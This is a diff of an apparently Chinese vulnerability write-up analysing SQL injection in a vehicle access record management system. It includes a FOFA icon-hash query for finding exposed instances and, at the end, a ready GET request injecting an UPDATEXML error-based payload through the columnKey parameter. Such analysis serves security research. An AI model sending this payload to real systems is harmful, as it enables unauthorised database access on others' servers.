@@ -17,18 +17,16 @@ V1.6.x
 # fofa语法
 
 > icon\_hash="1380907357"
->
-> 漏洞利用分析
 
 # 漏洞分析
 
 深入探索
 
-数据安全咨询
+网络安全
 
-授权
+网络设备
 
-网络安全培训
+商务软件和生产力软件
 
 直接看 `VehicleAccessRecordController` 里关于 `queryVehicleAccessRecord` 的实现
 
@@ -66,14 +64,6 @@ V1.6.x
             List<VehicleAccessRecord> list = this.vehicleAccessRecordAsm.queryVehicleAccessRecord(vehicleAccessRecordParam);
             PageInfo<VehicleAccessRecord> info = new PageInfo(list);
 ```
-
-深入探索
-
-漏洞利用手册
-
-网络安全培训课程
-
-Web应用防火墙
 
 跟进`queryVehicleAccessRecord`方法
 
@@ -120,7 +110,7 @@ List<VehicleAccessRecord> queryVehicleAccessRecord(VehicleAccessRecordParam var1
 
 > 本地复现没有 v\_car\_passrecord 这个表
 >
-> Windows安全工具
+> 计算机安全
 
 ```
 GET /manage/vehicleAccessRecord/queryVehicleAccessRecord.do?branchId=1&columnKey=AND+(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-06-25&end=2025-06-25&sn=111111 HTTP/1.1
